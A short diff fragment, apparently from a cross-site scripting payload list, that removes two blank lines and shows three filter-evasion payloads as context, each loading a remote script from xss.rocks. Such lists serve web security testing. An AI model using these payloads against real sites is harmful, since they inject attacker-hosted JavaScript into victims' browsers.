@@ -74,5 +74,3 @@ a="get";
 <SCRIPT "a='>'" SRC="http://xss.rocks/xss.js"></SCRIPT>
 <SCRIPT a=`>` SRC="http://xss.rocks/xss.js"></SCRIPT>
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="xss.rocks/xss.js"></SCRIPT>
-
-
